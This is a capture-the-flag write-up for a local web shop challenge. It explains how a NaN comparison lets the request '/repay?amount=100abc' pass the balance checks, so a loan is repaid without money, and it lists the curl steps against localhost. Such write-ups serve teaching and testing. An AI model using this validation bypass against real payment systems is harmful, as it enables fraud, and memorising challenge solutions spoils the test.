# Problem
The goal of this challenge is to buy the Swampshade Serum.
You do not have any gold, however you can borrow some from the merchant.
You can then buy the serum.
To get the flag, you need to checkout but only after repaying the exact amount of money you borrowed.

docker run -d -p 3000:3000 --name my_container my_image

# Solution
```javascript 
// ParseInt() and Number() have different behaviors 
parseInt("10abc") => 10
Number("10abc") => NaN

// Using this fact, we can byass the following check:
req.session.user.money < Number(amount) || req.session.user.debtAmount < Number(amount)

Number("100abc") => NaN
req.session.user.debtAmount < NaN => false
req.session.user.money < NaN => false

// So we can repay the loan even if we don't have any money
```

## Borrow gold
```bash
curl http://localhost:3000/borrow?amount=100
```

## Buy Swampshade Serum
```bash
curl http://localhost:3000/buy?id=4
```

# Repay the loan
```bash
curl http://localhost:3000/repay?amount=100abc
```

https://github.com/denysdovhan/wtfjs?tab=readme-ov-file#magically-increasing-numbers